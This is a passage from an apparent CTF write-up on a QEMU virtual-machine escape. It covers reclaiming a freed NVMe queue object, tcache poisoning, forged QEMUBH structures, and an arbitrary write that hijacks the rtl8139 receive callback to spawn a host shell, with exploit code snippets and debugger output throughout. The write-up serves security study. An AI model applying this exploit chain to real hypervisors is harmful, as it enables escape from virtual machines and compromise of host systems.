pwndbg> x/10gx cq
0x56501f4cdcf0: 0x4141414141414141      0x000000001fa74141
0x56501f4cdd00: 0x4141414141410000      0x4141414141414141
0x56501f4cdd10: 0x4141414141414141      0x4141414141414141
0x56501f4cdd20: 0x4141414141414141      0x4141414141414141
0x56501f4cdd30: 0x4141414141414141      0x4141414141414141
```

Wonderful! We’ve successfully reclaimed the freed CQ object with controllable data.



#### 6.4 Tcache Poisoning

Although the assert check passes, `nvme_enqueue_req_completion()` will still encounter an invalid memory access partway through execution.

```
<nvme_enqueue_req_completion+451>    mov    qword ptr [rax], rdx            <Cannot dereference [0x4141414141414141]>
```

This is because when updating the request linked list (`cq->req_list`), it accesses `tql_prev` from `NvmeCQueue` [1]. However, this address points to invalid memory (0x4141414141414141).

```c
static void nvme_enqueue_req_completion(NvmeCQueue *cq, NvmeRequest *req)
{
    // [...]
    QTAILQ_REMOVE(&req->sq->out_req_list, req, entry);
    QTAILQ_INSERT_TAIL(&cq->req_list, req, entry); // [1]
    qemu_bh_schedule(cq->bh); // [2]
}
```

At this point, we just need to set the member `tql_prev` to a valid and unused memory address to prevent a crash [3]. Since `QTAILQ_INSERT_TAIL()` doesn't use `tql_next`, we can set it to any value [4].

```c
*(unsigned long *)(uaf_data + 0x60) = 0xdeadbeef;   // [4], tql_next
*(unsigned long *)(uaf_data + 0x68) = heap + 0x870; // [3], tql_prev
```

After updating the linked list, `qemu_bh_schedule()` is called with `cq->bh` as a parameter [2]. This function schedules a bottom half job by directly invoking `aio_bh_enqueue()`. `aio_bh_enqueue()` first checks if the `QEMUBH` object’s flag includes `BH_PENDING` [5]. If it does not, indicating the bottom half job has not yet been scheduled, the job is added to the `AioContext` object's linked list [6].

```c
static void aio_bh_enqueue(QEMUBH *bh, unsigned new_flags)
{
    AioContext *ctx = bh->ctx;
    unsigned old_flags;

    old_flags = qatomic_fetch_or(&bh->flags, BH_PENDING | new_flags);

    if (!(old_flags & BH_PENDING)) { // [5]
        QSLIST_INSERT_HEAD_ATOMIC(&ctx->bh_list, bh, next); // [6]
    }
    // [...]
}
```

To construct a fake `QEMUBH` object, I set `cq->bh` to another controllable chunk, which is actually the seventh stream of the HDA.

```c
*(unsigned long *)(uaf_data + 0x38) = heap + 0x40340; // bh
```

Additionally, I made `&bh->ctx->bh_list` point to the 0x50 chunk of `tcache_perthread_struct` [7]. This means that after executing `QSLIST_INSERT_HEAD_ATOMIC()`, **the first chunk of the 0x50 tcache will point to the bh address**.

```c
unsigned long target_addr = heap + 0xa8; // address of tcache 0x50
*(unsigned long *)(bh + 0x0) = target_addr - 0xb8; // [7], ctx
*(unsigned long *)(bh + 0x28) = 0;                 // flags
```

The output of gdb debug message is as follows:

```
pwndbg> p bh
$6 = (QEMUBH *) 0x5621ed6de340

pwndbg> tcachebins
# [...]
0x50 [  7]: 0x5621ed6de340 ◂— 0x56248f77092e
# [...]
```



#### 6.5 Arbitrary Write

Due to the overlap between **the first chunk of tcache 0x50** and **the HDA stream 7 BDL object**, we can control the tcache fd pointer to any address by reallocating the stream 7 BDL. This allows us to allocate memory chunk at that address and control its content during the subsequent 0x50 chunk allocation. The specifics of tcache poisoning will not be detailed here.

It is important to note that since tcache poisoning occurs in the main thread heap, and both rtl8139 and hda are handled directly by the IO thread instead of BH, the allocation and release of objects must first go through an NVMe MMIO access. For this, I chose to use the NVMe admin command `NVME_ADM_CMD_SET_FEATURES` to set up the data to be written [1], and then `NVME_ADM_CMD_GET_FEATURES` to write the data to the MMIO of other devices [2]. This ensures that the main thread heap is used.

```c
// [1]
cmd.opcode = NVME_ADM_CMD_SET_FEATURES;
cmd.cdw10 = NVME_HOST_BEHAVIOR_SUPPORT;
cmd.dptr.prp1 = virt_to_phys(tmpbuf2); // written data
run_nvme_cmd_q0(&cmd);

// [2]
memset(&cmd, 0, sizeof(cmd));
cmd.opcode = NVME_ADM_CMD_GET_FEATURES;
cmd.cdw10 = NVME_HOST_BEHAVIOR_SUPPORT;
cmd.dptr.prp1 = 0xfebf9000 + TxPoll; // the MMIO of other devices
run_nvme_cmd_q0(&cmd);
```



#### 6.6 Get Shell

To control RIP, I chose to modify global variable `net_rtl8139_info` because we can control the timing of the `.receive` callback [1] invocation.

```c
static NetClientInfo net_rtl8139_info = {
    // [...]
    .receive = rtl8139_receive, // [1]
    // [...]
};
```

When rtl8139 transmits data, `nc_sendv_compat()` is called internally, which in turn invokes `net_rtl8139_info.receive()`. Fortunately, when `->receive()` is called, the second parameter is the tx data buffer, which means we can control its content.

```c
static ssize_t nc_sendv_compat(NetClientState *nc, const struct iovec *iov,
                               int iovcnt, unsigned flags)
{
    // [...]
    ret = nc->info->receive(nc, buffer, offset);
    // [...]
}
```

With some difficulty I found a magic gadget within `net_bridge_run_helper()`. It execute command "/bin/sh" with argument list (`args`).

```c
static int net_bridge_run_helper(/* ... */)
{
    // [...]
    execv("/bin/sh", args);
    // [...]
}
```

In order to spawn a bash shell, I setup `"sh -c /bin/bash"` arguments in the tx data buffer.

```c
unsigned long str_sh = text + 0xdc2131;
unsigned long str_dash_c = text + 0xdc2134;

*(unsigned long *)(txbuf + 0x00) = str_sh;
*(unsigned long *)(txbuf + 0x08) = str_dash_c;
*(unsigned long *)(txbuf + 0x10) = (heap + 0x1282a60) + 0x80; // ----
*(unsigned long *)(txbuf + 0x18) = 0;                         //    |
                                                              //    |
*(unsigned long *)(txbuf + 0x80) = 0x7361622f6e69622f; // <----------
*(unsigned long *)(txbuf + 0x88) = 0x68;
```

Finally, the next time we transmit data using rtl8139, the `net_rtl8139_info.receive()` function will be called. This will execute the command `/bin/sh -c /bin/bash`, giving us a bash shell!

You can find the exploit [here](/assets/hitconctf-qual-2024-reEscape-exp.c).

